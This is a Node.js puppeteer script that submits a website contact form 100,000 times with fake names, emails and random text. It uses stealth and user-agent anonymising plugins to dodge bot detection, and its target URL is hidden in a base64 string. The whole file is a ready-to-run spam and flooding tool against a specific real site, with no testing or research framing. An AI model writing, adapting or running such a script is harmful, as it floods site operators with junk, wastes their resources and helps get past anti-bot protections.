const faker = require('faker');
const {
    Cluster
} = require('puppeteer-cluster')
const vanillaPuppeteer = require('puppeteer')
const txtgen = require('txtgen');
const {
    addExtra
} = require('puppeteer-extra')
const Stealth = require('puppeteer-extra-plugin-stealth')
const Recaptcha = require('puppeteer-extra-plugin-recaptcha');
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker')
const userAgent = require('user-agents');
const DateGenerator = require('random-date-generator');
const publicIp = require('public-ip');
const date = require('date-and-time')

async function main() {
    // Create a custom puppeteer-extra instance using `addExtra`,
    // so we could create additional ones with different plugin config.
    const puppeteer = addExtra(vanillaPuppeteer)
    puppeteer.use(Stealth())
    puppeteer.use(AdblockerPlugin({
        blockTrackers: true
    }))
    puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')())
    puppeteer.use(require('puppeteer-extra-plugin-block-resources')({
        blockedTypes: new Set(['image', 'stylesheet', 'media'])
    }))

    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 4,
        timeout: 100000,
        puppeteerOptions: {
            headless: true
        }
    });
    // Event handler to be called in case of problems
    cluster.on('taskerror', (err, data) => {
        console.log(`Exception in ${data}: ${err.message}`);
    });

    await cluster.task(async ({
        page,
        data: url
    }) => {
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            if (req.resourceType() === 'image') {
                req.abort();
            } else {
                req.continue();
            }
        });

        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 0
        });
        await page.waitForSelector('input[name="your-name"]')
        let firstName = faker.name.firstName()
        let lastName = faker.name.lastName()
        let email = faker.internet.email()

        await page.type('input[name="your-name"]', firstName + " " +lastName)
        await page.type('input[name="your-email"]', email)
        await page.type('input[name="your-subject"]', txtgen.sentence())
        await page.type('textarea[name="your-message"]', txtgen.paragraph())

        await page.click('input[value="Submit"]')

        console.log(`Contact Form Submitted: ${firstName} ${lastName} - ${email}`)
    });

    for (let i = 0; i < 100000; i++) {
        cluster.queue(Buffer.from("aHR0cHM6Ly93d3cudGhlaGtpcC5jb20vY29udGFjdC11cy8=", 'base64').toString('binary'))
    }

    console.log(`Current Public IP: ${await publicIp.v4()}`)

    await cluster.idle();
    await cluster.close();
}

main().catch(console.warn)